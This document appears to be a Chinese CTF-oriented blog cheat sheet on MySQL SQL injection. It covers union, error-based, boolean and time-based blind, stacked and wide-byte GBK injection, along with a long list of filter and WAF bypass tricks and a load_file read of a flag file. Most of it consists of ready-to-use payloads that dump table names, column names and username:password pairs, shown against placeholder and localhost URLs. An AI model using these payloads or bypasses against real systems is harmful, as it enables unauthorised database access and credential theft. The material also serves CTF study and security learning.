<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.获取字段数，用order by 或 group by</span><br><span class="line"></span><br><span class="line">2.列名为 id、name、password  列名被替换成对应的数字</span><br><span class="line">  select 1,2,3 union select * from admin;</span><br><span class="line">  </span><br><span class="line">3.数字对应列，获取某一列的信息（末尾的 a 可以是任意字符，用于命名。）</span><br><span class="line">  select `3` from (select 1,2,3 union select * from   admin)a;</span><br><span class="line">多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</span><br><span class="line">  select b from (select 1,2,3 as b union select *     from admin)a;</span><br><span class="line"> 同时查询多个列</span><br><span class="line"> select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br><span class="line"> </span><br><span class="line">4.</span><br><span class="line">  select a,b from posts where a=-1 union select 1,   (select concat(`3`,0x2d,`4`) from (select           1,2,3,4,5,6 union select * from xxx)a limit       1,1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="用-sys-schema-auto-increment-columns-来注表名"><a href="#用-sys-schema-auto-increment-columns-来注表名" class="headerlink" title="用 sys.schema_auto_increment_columns 来注表名"></a>用 sys.schema_auto_increment_columns 来注表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</span><br><span class="line">1.111&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br><span class="line"></span><br><span class="line">2.111&#x27;/**/union/**/select/**/1,(select/**/aaa/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br><span class="line"></span><br><span class="line">3.111&#x27;/**/union/**/select/**/1,(select/**/bbb/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select table_schema from sys.schema_auto_increment_columns;　　//查数据库</span><br><span class="line"></span><br><span class="line"> select table_name from sys.schema_auto_increment_columns where table_schema = &#x27;test&#x27;;　　//查表</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h3><p>当 “in” 被过滤时，information_schema 和 mysql.innodb_table_stats 同时也被过滤了。这时可以用<strong>sys.schema_table_statistics</strong>来获取库名、表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();</span><br><span class="line"></span><br><span class="line">.利用join获取列名（join在CTF中经常使用的思路</span><br><span class="line">select * from user where id = -1 union all select * from (select * from user as a join user as b)as c;</span><br><span class="line"></span><br><span class="line">获取更多字段名和字段值</span><br><span class="line"> select * from user where id = -1 union all select*from (select * from user as a join user b using(id,username,passwd,phone))c;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="mysql-innodb-table-stats"><a href="#mysql-innodb-table-stats" class="headerlink" title="mysql.innodb_table_stats"></a>mysql.innodb_table_stats</h3><p>当 “or” 被过滤了导致information_schema不能用时，我们可以用<strong>mysql.innodb_table_stats</strong>这个表来获取库名、表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line">查询表名</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;查询表的内容</span><br></pre></td></tr></table></figure>



<h3 id="sys-schema-table-statistics"><a href="#sys-schema-table-statistics" class="headerlink" title="sys.schema_table_statistics"></a>sys.schema_table_statistics</h3><p>显然，当 “in” 被过滤时，information_schema 和 mysql.innodb_table_stats 同时也被过滤了。这时可以用<strong>sys.schema_table_statistics</strong>来获取库名、表名</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107935479">https://blog.csdn.net/Mr_helloword/article/details/107935479</a>)</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>判断注入方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1--+ 正确</span><br><span class="line"></span><br><span class="line">？id=1&#x27; and 1=2--+ 错误</span><br></pre></td></tr></table></figure>

<p>如果没有完全显示可以用not in</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;and column_n</span><br><span class="line">ame not in(&#x27;user_id&#x27;,&#x27;first_name&#x27;,&#x27;last_name&#x27;,&#x27;user&#x27;,&#x27;avatar&#x27;,&#x27;last_login&#x27;,&#x27;failed_login&#x27;))))--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password)from users)))--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password)from users where username not in (&#x27;Dumb&#x27;,&#x27;I-kill-you&#x27;,))))--+</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆数据库?username=admin&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))or&#x27;1&amp;password=1​</span><br><span class="line"></span><br><span class="line">报表名?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​爆列名?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))or&#x27;1&amp;password=1​</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">密码?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1​​</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/90812612">(43条消息) sql注入之报错注入_silence1_的博客-CSDN博客_报错注入</a></p>
<h2 id="sql注入绕过大全"><a href="#sql注入绕过大全" class="headerlink" title="sql注入绕过大全"></a>sql注入绕过大全</h2><p><strong>基本绕过方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.大小写</span><br><span class="line">2.双写</span><br><span class="line">3.编码，如URLEncode编码，ASCII编码绕过</span><br><span class="line">4.内敛注释</span><br></pre></td></tr></table></figure>

<p><strong>空格绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.用注释替换空格</span><br><span class="line">select/**/user,password/**/from /**/users;</span><br><span class="line">2.空格url编码%20</span><br><span class="line">3.两个空格代替一个空格</span><br><span class="line">4.用Tab代替空格</span><br><span class="line">5.%a0=空格</span><br><span class="line">6.如果空格被过滤，括号没有被过滤，可以用括号绕过</span><br><span class="line">select(user())from dual where(1=1)and(2=2)</span><br><span class="line">7.回车</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>引号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.使用十六进制</span><br><span class="line">例如：</span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">如引号被过滤，就可以尝试使用十六进制来进行绕过</span><br><span class="line">即可以将语句写为：</span><br><span class="line">select column_name from information_schema.columns where table_name=0x7573657273;</span><br><span class="line"></span><br><span class="line">2.还有一个办法（前提是已经得知数据库名称和表名，例如dvwa和users）：</span><br><span class="line">select column_name from information_schema.columns where table_schema=database();</span><br><span class="line">查询所在数据库中的所有列名,然后</span><br><span class="line">可以猜或者尝试得知哪些字段在哪个表中，然后：</span><br><span class="line">select username,password from users;</span><br><span class="line"></span><br><span class="line">3.宽字节注入</span><br></pre></td></tr></table></figure>

<p><strong>逗号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit,这些子句方法都需要使用到逗号</span><br><span class="line"></span><br><span class="line">对于substr()和mid()这两个方法可以使用from的方式来解决：</span><br><span class="line">select substr(database() from 1 for 1);</span><br><span class="line"></span><br><span class="line">使用join</span><br><span class="line">union select 1,2 可以使用下面的句子代替</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br><span class="line"></span><br><span class="line">使用like</span><br><span class="line">select ascii(mid(user(),1,1))=80 可以使用下面的句子代替</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br><span class="line"></span><br><span class="line">limit中，使用offset绕过</span><br><span class="line">limit 1offset0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>or and xor not 绕过</strong>**</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用符号替换and = &amp;&amp; or=|| xor=| not=!</span><br><span class="line">在敏感词中添加注释：an/**/d</span><br><span class="line">双写绕过oorr</span><br><span class="line">大小写变形</span><br><span class="line">编码</span><br></pre></td></tr></table></figure>

<p><strong>注释符绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3 or &#x27;1&#x27;=&#x27;1 即虽然无法使用注释符，但是可以闭合掉他</span><br><span class="line">或者：id=1&#x27; union select 1,2,&#x27;3</span><br><span class="line">最后添加or 1&#x27;</span><br><span class="line">最后添加 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>等号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用like</span><br><span class="line">使用!&lt;&gt;,因为&lt;&gt;是不等于</span><br><span class="line">regrep (正则表达匹配)</span><br></pre></td></tr></table></figure>

<p>&lt;&gt;<strong>被过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">greatest(),least()</span><br><span class="line">strcmp(str1,str2),第一个参数小于第二个参数，返回-1，否则为1</span><br><span class="line">in，between a and b</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44940180/article/details/107717511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&utm_relevant_index=1">(43条消息) SQL注入–绕过技巧_雪碧可乐_的博客-CSDN博客_sql注入绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fastergohome/article/details/102514160">(44条消息) CTF 中的 SQL 注入总结_重新启程-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AikN/p/15725756.html">https://www.cnblogs.com/AikN/p/15725756.html</a>)</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584#h2-12">CTF中几种通用的sql盲注手法和注入的一些tips - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</span><br><span class="line"></span><br><span class="line">2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示</span><br><span class="line"></span><br><span class="line">3、判断字符型注入还是数字型注入（2-1，’是否正常）</span><br><span class="line"></span><br><span class="line">4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））</span><br><span class="line"></span><br><span class="line">5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）</span><br><span class="line"></span><br><span class="line">6、进行fuzz，看看那些被waf了</span><br><span class="line"></span><br><span class="line">7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or ‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）</span><br><span class="line"></span><br><span class="line">8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过</span><br><span class="line"></span><br><span class="line">9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注</span><br><span class="line"></span><br><span class="line">10、先在bp中跑一遍看是否有结果</span><br><span class="line"></span><br><span class="line">11、尝试写脚本</span><br></pre></td></tr></table></figure>

<h2 id="boolean注入"><a href="#boolean注入" class="headerlink" title="boolean注入"></a><strong>boolean注入</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">判断方式：</span><br><span class="line">   通过长度判断 length(): length(database())&gt;=x</span><br><span class="line">   通过字符判断 substr():substr(database() ,1,1)= &#x27;s&#x27;</span><br><span class="line">   通过 ascII 码判断:ascii():ascii(substr(database(),1,1)) =x </span><br><span class="line">   注入漏洞判断：</span><br><span class="line">   1.id=1&#x27;   报错 </span><br><span class="line">   2.id=1 and 1=1  结果和 id=1 一样</span><br><span class="line">   3.id=1 and 1=2  结果异常</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A:判断数据库名的长度 http://xxxxxx?id=1&#x27; and length(database())&gt;=1--+  从而判 断数据库名的长度为 4</span><br><span class="line">  B:判断数据库名 Substr() 数据库库名 a~z,0~9 ‘and substr(database(),1,1)--+ </span><br><span class="line">  C:Burp 判断数据库名 http://xxxxxxxx?id=1&#x27; and substr(database(),1,1)=&#x27;a&#x27;--+ 逐字判断数据库名为 test，test 数据库名 </span><br><span class="line">  D:Burpsuite 爆破数据库的表名 http://xxxxxx?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+ person     users   xss  //三个表</span><br><span class="line">  E:Burp 爆字段名 http://xxxxxxxx?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+ id   username  password 等</span><br><span class="line">  F:获取数据 http://xxxxx?id=1&#x27; and substr((select username from test.users limit 0,1),1,1)=&#x27;a&#x27;--+ </span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断数据库名的长度</span><br><span class="line"> http://xxxxxx?id=1 and if(length(database())&gt;=6,sleep(5),1) </span><br><span class="line">爆库名</span><br><span class="line"> http://xxxxxxx?id=1 and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)   数据库名为 test </span><br><span class="line">爆表名</span><br><span class="line"> http://xxxxxxx?id=1 and if(substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1)  表名 </span><br><span class="line">爆字段</span><br><span class="line">  http://xxxxxxx?id=1 and if(substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1)  </span><br><span class="line">爆数据 </span><br><span class="line"> http://xxxxxxxxxx?id=1 and if(substr(select username from test.users limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) 由于数据库名的范围一般在 a~z,0~9，特殊字符，大小写等</span><br></pre></td></tr></table></figure>

<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>使用条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有 当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query()函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所 以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆库名：test http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)</span><br><span class="line"> 爆表名 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br><span class="line"> 爆字段名 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; where table_name=&#x27;user&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br><span class="line"> 爆值 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select username from test.users limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br></pre></td></tr></table></figure>

<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入主要是源于程序员设置数据库编码与 php 编码设置为不同的两个编码，这样就可能会产 生宽字节注入。GBK 占用两字节，ASCII 占用一字节。PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为‚\‛），MYSQL 默认字符集是 GBK 等宽字节字符集。 输入%df%27,本来\ 会转义%27（’），但\（其中\的十六进制是 %5C）的编码位数为 92，%df 的 编码位数为 223，%df%5c 符合 gbk 取值范围（第一个字节 129-254，第二个字节 64-254），会解析 为一个汉字‚運‛，这样\就会是去应有的作用。 id=1’ id=1%df%5c’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1 </span><br><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1’ </span><br><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1%df’</span><br><span class="line"> 从返回的结果可以看出，参数 id=1 在数据库查询是被单引号包围的。当传入参数 id=1’时， 传入的单引号又被转义符（反斜线）转义，导致参数 ID 无法逃逸单引号的包围，所以在一般情况下， 此处是不存在 SQL 注入漏洞的。不过有一个特例，就是当数据库的编码为 GBK 时，可以使用宽字节 注入，宽字节的格式是在地址后先加一个%df,再加单引号，因为反斜杠的编码为%5c,而在 GBK 编码 中，%df%5c 是繁体字連，所以这时，单引号成功逃逸，爆出 Mysql 数据库错误。</span><br><span class="line">  %df%27====&gt;(check_addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運&#x27;</span><br><span class="line">   $sql=&quot;SELECT * FROM users WHERE id=&#x27;1 運&#x27;&#x27; LIMIT 0,1&quot;; #成功将单引号闭合，可以进行 SQL 注入。</span><br><span class="line">    判断数据库表有 6 个字段数 http://127.0.0.1/web/sql/kuanzifu.php?id=1%df%27%20order%20by%207--+</span><br><span class="line">     http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df%27%20union%20select%201,2,3,4,5,6--+ </span><br><span class="line">    爆库名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df%27%20union%20select%201,2,3,(databas e()),5,6--+</span><br><span class="line">    爆表名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df&#x27; union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=(select database())),5,6%23</span><br><span class="line">    爆字段名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df&#x27; union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 1,1)),5,6%23 </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/397815893?utm_source=qq&utm_medium=social&utm_oi=1204405106541780992">Web漏洞之SQL注入详解 - 知乎 (zhihu.com)</a></p>
<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure>

